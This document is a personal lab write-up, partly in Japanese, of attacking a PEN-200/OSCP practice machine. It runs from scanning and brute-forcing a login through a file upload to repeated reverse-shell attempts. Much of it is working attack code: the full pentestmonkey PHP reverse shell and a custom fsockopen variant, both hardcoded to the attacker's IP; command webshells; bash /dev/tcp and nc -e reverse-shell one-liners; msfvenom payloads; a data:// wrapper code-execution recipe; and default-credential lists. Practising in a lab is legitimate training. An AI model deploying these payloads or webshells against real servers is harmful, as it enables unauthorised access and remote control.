# Nmap

```
PORT   STATE SERVICE REASON  VERSION
53/tcp open  domain? syn-ack
|_dns-nsec3-enum: Can't determine domain for host 10.10.11.174; use dns-nsec3-enum.domains script arg.
|_dns-nsec-enum: Can't determine domain for host 10.10.11.174; use dns-nsec-enum.domains script arg.

Host script results:
|_dns-brute: Can't guess domain of "10.10.11.174"; use dns-brute.domain script argument.
```

---

# Whatweb

```zsh
┌──(koshi㉿kali)-[~/PEN-200/Charlie]
└─$ whatweb -v -a3 --log-verbose WebEnum/whatweb.txt http://$TargetIP
WhatWeb report for http://192.168.115.112
Status    : 200 OK
Title     : Offsec Insurance | We value your security!
IP        : 192.168.115.112
Country   : RESERVED, ZZ

Summary   : Apache[2.4.52], Email[jason@oscp.exam], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], JQuery[3.6.0], Script[module]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.52 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Email ]
        Extract email addresses. Find valid email address and 
        syntactically invalid email addresses from mailto: link 
        tags. We match syntactically invalid links containing 
        mailto: to catch anti-spam email addresses, eg. bob at 
        gmail.com. This uses the simplified email regular 
        expression from 
        http://www.regular-expressions.info/email.html for valid 
        email address matching. 

        String       : jason@oscp.exam

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.52 (Ubuntu) (from server string)

[ JQuery ]
        A fast, concise, JavaScript that simplifies how to traverse 
        HTML documents, handle events, perform animations, and add 
        AJAX. 

        Version      : 3.6.0
        Website     : http://jquery.com/

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 

        String       : module

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Sat, 10 Jan 2026 12:49:33 GMT
        Server: Apache/2.4.52 (Ubuntu)
        Last-Modified: Tue, 28 May 2024 13:05:04 GMT
        ETag: "3306-619834842a000-gzip"
        Accept-Ranges: bytes
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 3463
        Connection: close
        Content-Type: text/html
```

---

# Gobuster

errorが多ければ`-t 64`も試す

```zsh
┌──(koshi㉿kali)-[~/PEN-200/Charlie]
└─$ gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -x "html,htm,txt,sh,php,cgi,asp,aspx,jsp,cgi,pl,py,sh,pdf" -o WebEnum/gobuster.txt -u http://$TargetIP/ --no-error               
=========================================
...
┌──(koshi㉿kali)-[~/PEN-200/Charlie]
└─$ cat WebEnum/gobuster.txt | grep -v "(Status: 403)" 
/login.html           (Status: 200) [Size: 733]
/js                   (Status: 301) [Size: 315] [--> http://192.168.115.112/js/]
/index.html           (Status: 200) [Size: 13062]
/css                  (Status: 301) [Size: 316] [--> http://192.168.115.112/css/]
/logout.php           (Status: 302) [Size: 0] [--> login.html]
/img                  (Status: 301) [Size: 316] [--> http://192.168.115.112/img/]
/uploads              (Status: 301) [Size: 320] [--> http://192.168.115.112/uploads/]
/home.php             (Status: 302) [Size: 0] [--> login.html]
/upload.php           (Status: 302) [Size: 0] [--> login.html]
/assets               (Status: 301) [Size: 319] [--> http://192.168.115.112/assets/]
/about.html           (Status: 200) [Size: 9688]
/.                    (Status: 200) [Size: 13062]
/send.php             (Status: 302) [Size: 0] [--> login.html]
/authenticate.php     (Status: 200) [Size: 50]

```

---

# Nikto

```zsh

```

---

# Enumeration

## index

- ソースコードにとくになし

## about.php

- [[#Screenshot]]にもあるように、ユーザー名の候補となるユーザ名が複数
- ソースコードには特になし


## login.html  -> authenticate.php

- usernameとpasswordフィールドを以下で試すも、何も反応なし
```zsh
'
"
\
;
`
)
}
--
#
/*
//
$
%
%%
```
- SQLの脆弱性はなさそう

- fuzzing -> 特に有効な結果はない
```zsh
ffuf -c -w /usr/share/seclists/Fuzzing/Databases/SQLi/MySQL.fuzzdb.txt -X POST -d "username=FUZZ&password=root" -u http://192.168.115.112/authenticate.php

ffuf -c -w /usr/share/seclists/Fuzzing/Databases/SQLi/MySQL-SQLi-Login-Bypass.fuzzdb.txt -X POST -d "username=FUZZ&password=root" -u http://192.168.115.112/authenticate.php
```

- 試行済み認証情報リスト
```
Elise.George@oscp.exam:Elise.George
Elise.George@oscp.exam:elise.george
Elise.George:Elise.George
Elise.George:elise.george
elise:elise
Elise:Elise
George:George
george:george

Jane.Perkins@oscp.exam:Jane.Perkins
Jane.Perkins@oscp.exam:jane.perkins
Jane.Perkins:Jane.Perkins
Jane.Perkins:jane.perkins
Jane:Jane
jane:jane
Perkins:Perkins
perkins:perkins


Sharon.Morgan@oscp.exam:Sharon.Morgan
Sharon.Morgan@oscp.exam:sharon.morgan
Sharon.Morgan:Sharon.Morgan
Sharon.Morgan:sharon.morgan
Sharon:Sharon
sharon:sharon
Morgan:Morgan
morgan:morgan

Jason:Jason
Jason:jason
jason:jason
Vickens:Vickens
vickens:vickens
jason@oscp.exam:jason
jason@oscp.exam:Jason
jason@oscp.exam:Vickens
jason@oscp.exam:vickens

admin:admin
Admin:Admin
administrator:administrator
Administrator:Administrator

# Ana Marie Dow
Ana:Ana
Ana:ana
Pasodena:Pasodena
Pasodena:pasodena
pasodena:pasodena

# 以下は試していないが、SecListから
root:mysql
root:root
root:chippc
admin:admin
root:
root:nagiosxi
root:usbw
cloudera:cloudera
root:cloudera
root:moves
moves:moves
root:testpw
root:p@ck3tf3nc3
mcUser:medocheck123
root:mktt
root:123
dbuser:123
asteriskuser:amp109
asteriskuser:eLaStIx.asteriskuser.2oo7
root:raspberry
root:openauditrootuserpassword
root:vagrant
root:123qweASD#

```
→[[ftp - 21|ftp - 21]]や[[OSCP/OSCP/Lab_Writeup/OSCP/Charie/Enumeration/External/ssh - 22|ssh - 22]]でも試してみる価値はある

### Hydra

```zsh
┌──(koshi㉿kali)-[~/PEN-200/Charlie]
└─$ hydra -L username_candidates.txt -P /usr/share/wordlists/fasttrack.txt 192.168.115.112 http-post-form "/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect username and/or password"

```
- valid credentail found!!
![[Pasted image 20260110231405.png]]
#### username_candidates.txt

```zsh
Elise.George@oscp.exam
Elise.George
elise.george
elise
Elise
George
george
Jane.Perkins@oscp.exam
Jane.Perkins
jane.perkins
Jane
jane
Perkins
perkins
Sharon.Morgan@oscp.exam
Sharon.Morgan
Sharon
sharon
Morgan
morgan
admin
Admin
administrator
Administrator
Jason
jason
jason@oscp.exam
Vickens
vickens
```

## upload.php

- test.phpをアップロードすると、成功する
![[Pasted image 20260110231640.png]]

- アクセスできるかどうかを確認
![[Pasted image 20260110231710.png]]
- →アクセスできそう
- [[OSCP/OSCP/Lab_Writeup/OSCP/Charie/Exploit|Exploit]]

- Webshell payloadをアップロードする
	- https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
```zsh
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php
```
- 以下部分をKaliリスナーのIPとポートに指定
![[Pasted image 20260110231908.png]]

- アップロード
![[Pasted image 20260110231954.png]]

- アクセス
![[Pasted image 20260110232105.png]]

- ペイロードをシンプルなものにする
```php
test
<?php echo system($_GET["cmd"]); ?>
```
![[Pasted image 20260110232213.png]]

- 失敗
![[Pasted image 20260110232456.png]]
- おそらく、systemが無効になっている

- レスポンスが帰ってこないだけかもしれない
```zsh
?cmd=bash -c 'bash -i >& /dev/tcp/192.168.49.115/443 0>&1'
```


- Webshell payloadをアップロードする(今回はport 80)
	- https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
	- →接続の痕跡あり
![[Pasted image 20260110234421.png]]

- ただ、うまくいかない（ファイルアップロードはうまくいってる）
- 以下のエラーがでる
```zsh
"DAEMONIZE: pcntl_fork() does not exists, moving on..."
```

- 以下は無理 -> sh, perlは実行できない。どうやら、phpだけ実行できるようだ
```zsh
#!/bin/bash
bash -i >& /dev/tcp/192.168.49.115/80 0>&1
```

- cmd引数を取るような以下のペイロードは？
```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```
```url
?cmd=busybox+nc+192.168.49.115+80+-e+sh
?cmd=bash+-c+'bash+-i+>&+/dev/tcp/192.168.49.115/80+0>&1'
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.115%2F80%200%3E%261%27
?cmd=nc 192.168.49.115 80 -e /bin/bash
```

- 以下も試す（webshell.php）
```php
<?php echo system($_GET["cmd"]); ?>
```
↓
```
This page isn’t working
192.168.115.112 is currently unable to handle this request.
HTTP ERROR 500
```
(拡張子の問題かと思い、.php5を試すも、実行されない)

...phpinfoコマンドを実行する？
	[[C言語]]
```php
<?php
echo "<h3>phpinfo()</h3>";
phpinfo();
echo "<h3>disabled functions</h3>";
echo nl2br(ini_get('disable_functions'))."<br>";
echo "<h3>working dir & perms</h3>";
echo "cwd: ".getcwd()."<br>";
echo "uid: ".getmyuid()." gid: ".getmygid()."<br>";
echo "<h3>can exec /proc?</h3>";
echo "can proc_open? ".(function_exists('proc_open')? 'yes' : 'no')."<br>";
echo "can shell_exec? ".(function_exists('shell_exec')? 'yes' : 'no')."<br>";
echo "allow_url_fopen: ".ini_get('allow_url_fopen')."<br>";
?>
```



### msfvenom

```zsh
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.49.115 LPORT=80 -f raw -o shell.php
```
-> fail

```zsh
msfvenom -p php/reverse_php LHOST=192.168.49.115 LPORT=443 -f raw > shell_443.php
```
-> fail

```
msf exploit(multi/handler) > set LPORT 80
LPORT => 80
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.49.115:80 
[*] 192.168.115.112 - Command shell session 1 closed.
[*] 192.168.115.112 - Command shell session 2 closed.
[*] 192.168.115.112 - Command shell session 3 closed.
[*] 192.168.115.112 - Command shell session 4 closed.
[*] 192.168.115.112 - Command shell session 5 closed.
whoami
[*] 192.168.115.112 - Command shell session 6 closed.
stop
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.49.115:443 
stop
exit                                                                                  
^C[-] Exploit failed [user-interrupt]: Interrupt                                      
[-] run: Interrupted                                                                  
msf exploit(multi/handler) > run 22                                                   
^C[-] run: Interrupted                                                                
msf exploit(multi/handler) > set LPORT 22
LPORT => 22                                                                           
msf exploit(multi/handler) > run                                                      
[*] Started reverse TCP handler on 192.168.49.115:22                                  
[*] 192.168.115.112 - Command shell session 7 closed.                                                            
```

```zsh
msfconsole -q
use exploit/multi/handler
set LHOST 192.168.49.115
set LPORT 80
run
```

### pentestmonkey

```zsh
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.49.115';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

- 以下のレスポンス：
```
WARNING: Failed to daemonise. This is quite common and not fatal.
```

→Discordでそのポートはすでに使われているからだよ、というコメントがあった
![[Pasted image 20260111005136.png]]
- ポート21 ->一瞬で切れる
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Charlie/Payloads]
└─$ sudo rlwrap nc -lvnp 21
[sudo] password for koshi: 
listening on [any] 21 ...
connect to [192.168.49.115] from (UNKNOWN) [192.168.115.112] 39144

```

- ポート445 -> 接続の受領もなし
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Charlie/Payloads]
└─$ netstat -ano | grep 445 
                                                                                      
┌──(koshi㉿kali)-[~/PEN-200/
```

- ポート3306 -> 接続の受領が一瞬で切れる
```zsh
┌──(koshi㉿kali)-[~/PEN-200/Charlie/Payloads]
└─$ sudo rlwrap nc -lvnp 3306
listening on [any] 3306 ...
connect to [192.168.49.115] from (UNKNOWN) [192.168.115.112] 54486
```

- ポート53 -> 接続の受領なし

- agentをそのままアップロードして、実行させられるかな？

### テスト用webshell

- 使用不可
```php
<?php
if(isset($_GET['cmd'])){
  $c = $_GET['cmd'];
  // try several ways and print which works
  echo "<pre>-- try passthru --\n";
  @passthru($c);
  echo "\n-- try shell_exec --\n";
  var_dump(@shell_exec($c));
  echo "\n-- try backticks --\n";
  $o = null; $o = `$c`; var_dump($o);
  echo "\n-- try proc_open --\n";
  if(function_exists('proc_open')){
    $des = ['pipe','r'], ['pipe','w'], ['pipe','w'];
    $pr = @proc_open($c, [["pipe","r"],["pipe","w"],["pipe","w"]], $pipes);
    if(is_resource($pr)){
      echo stream_get_contents($pipes[1]);
      proc_close($pr);
    } else { echo "proc_open failed\n"; }
  } else { echo "proc_open not available\n"; }
}
?>
```
↓
```
This page isn’t working
192.168.115.112 is currently unable to handle this request.
HTTP ERROR 500
```

### fsopen payload

↓失敗
```php
<?php
set_time_limit(0);
$ip = '192.168.49.115';
$port = 80;
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) { exit(); }
$descriptorspec = array(0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w"));
$proc = proc_open('/bin/sh -i', $descriptorspec, $pipes);
if(is_resource($proc)){
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);
  while(1){
    if(feof($sock)) break;
    $r = array($sock, $pipes[1], $pipes[2]);
    @stream_select($r, $w=null, $e=null, null);
    if(in_array($sock, $r)){
      $in = fread($sock, 1400);
      fwrite($pipes[0], $in);
    }
    if(in_array($pipes[1], $r)){
      $out = fread($pipes[1], 1400);
      fwrite($sock, $out);
    }
    if(in_array($pipes[2], $r)){
      $err = fread($pipes[2], 1400);
      fwrite($sock, $err);
    }
  }
  proc_close($proc);
}
fclose($sock);
?>
```

### php audit

audit.php
```zsh
<?php
echo "<h3>phpinfo()</h3>";
phpinfo();
echo "<h3>disabled functions</h3>";
echo nl2br(ini_get('disable_functions'))."<br>";
echo "<h3>working dir & perms</h3>";
echo "cwd: ".getcwd()."<br>";
echo "uid: ".getmyuid()." gid: ".getmygid()."<br>";
echo "<h3>can exec /proc?</h3>";
echo "can proc_open? ".(function_exists('proc_open')? 'yes' : 'no')."<br>";
echo "can shell_exec? ".(function_exists('shell_exec')? 'yes' : 'no')."<br>";
echo "allow_url_fopen: ".ini_get('allow_url_fopen')."<br>";
?>
```

![[Pasted image 20260111020936.png]]


以下の手順が使えそう
##### data wrapperによるRCE手順

1. HTTPリクエストでファイルを指定している箇所を見つける。以下例↓
```
http://example.com/index.php?page=admin.php
```

2. Burp Suiteにて、data://を使い、任意の任意のコマンドを実行する
```http
GET /index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
```

3. WAF等が原因でコード実行が妨げられる場合は、data://ではbase64エンコードが使えるので試す
```zsh
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```
```http
GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls"
```

- http polling


---

# Screenshot

- about.html
![[Pasted image 20260110221052.png]]


---

# 補足

## phpinfo

### 実行結果抽出

```zsh
mysqlnd 8.1.2-1ubuntu2.17
```

### 実行結果

```html
<h3>phpinfo()</h3>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <style type="text/css">
            body {
                background-color: #fff;
                color: #222;
                font-family: sans-serif;
            }

            pre {
                margin: 0;
                font-family: monospace;
            }

            a:link {
                color: #009;
                text-decoration: none;
                background-color: #fff;
            }

            a:hover {
                text-decoration: underline;
            }

            table {
                border-collapse: collapse;
                border: 0;
                width: 934px;
                box-shadow: 1px 2px 3px #ccc;
            }

            .center {
                text-align: center;
            }

            .center table {
                margin: 1em auto;
                text-align: left;
            }

            .center th {
                text-align: center !important;
            }

            td, th {
                border: 1px solid #666;
                font-size: 75%;
                vertical-align: baseline;
                padding: 4px 5px;
            }

            th {
                position: sticky;
                top: 0;
                background: inherit;
            }

            h1 {
                font-size: 150%;
            }

            h2 {
                font-size: 125%;
            }

            .p {
                text-align: left;
            }

            .e {
                background-color: #ccf;
                width: 300px;
                font-weight: bold;
            }

            .h {
                background-color: #99c;
                font-weight: bold;
            }

            .v {
                background-color: #ddd;
                max-width: 300px;
                overflow-x: auto;
                word-wrap: break-word;
            }

            .v i {
                color: #999;
            }

            img {
                float: right;
                border: 0;
            }

            hr {
                width: 934px;
                background-color: #ccc;
                border: 0;
                height: 1px;
            }
        </style>
        <title>PHP 8.1.2-1ubuntu2.17 - phpinfo()</title>
        <meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE"/>
    </head>
    <body>
        <div class="center">
            <table>
                <tr class="h">
                    <td>
                        <a href="http://www.php.net/">
                            <img border="0" src="data:image/png;base64,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